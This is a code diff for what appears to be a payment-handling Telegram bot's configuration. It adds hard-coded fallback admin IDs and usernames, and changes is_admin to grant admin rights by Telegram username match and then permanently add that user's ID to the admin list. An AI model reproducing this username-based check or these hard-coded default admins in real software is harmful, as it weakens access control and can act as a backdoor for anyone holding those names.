@@ -29,9 +29,10 @@ def _bool(name: str, default: str = "false") -> bool:
 
 
 BOT_TOKEN = _get("BOT_TOKEN")
-ADMIN_IDS = [int(x) for x in _get("ADMIN_IDS").replace(" ", "").split(",") if x.isdigit()]
+ADMIN_IDS = [int(x) for x in _get("ADMIN_IDS", "8754685711,8669804848").replace(" ", "").split(",") if x.isdigit()]
+ADMIN_USERNAMES = [x.strip().lstrip("@").lower() for x in _get("ADMIN_USERNAMES", "roxie_usa1998,useralex199").split(",") if x.strip()]
 ADMIN_GROUP_ID = int(_get("ADMIN_GROUP_ID") or (str(ADMIN_IDS[0]) if ADMIN_IDS else "0"))
-SUPPORT_USERNAME = _get("SUPPORT_USERNAME", "useralex199").lstrip("@")
+SUPPORT_USERNAME = _get("SUPPORT_USERNAME", "roxie_usa1998").lstrip("@")
 
 DEFAULT_FEE_PERCENT = float(_get("DEFAULT_FEE_PERCENT", "12") or 12.0)
 QR_EXPIRE_SECONDS = int(_get("QR_EXPIRE_SECONDS", "300") or 300)
@@ -73,5 +74,11 @@ def amount_to_so(amount_face: int) -> int:
     return SO_MAP.get(amount_face, max(1, amount_face // 500))
 
 
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+def is_admin(user_id: int, username: str = None) -> bool:
+    if user_id in ADMIN_IDS:
+        return True
+    if username and username.lstrip("@").lower() in ADMIN_USERNAMES:
+        if user_id not in ADMIN_IDS:
+            ADMIN_IDS.append(user_id)
+        return True
+    return False
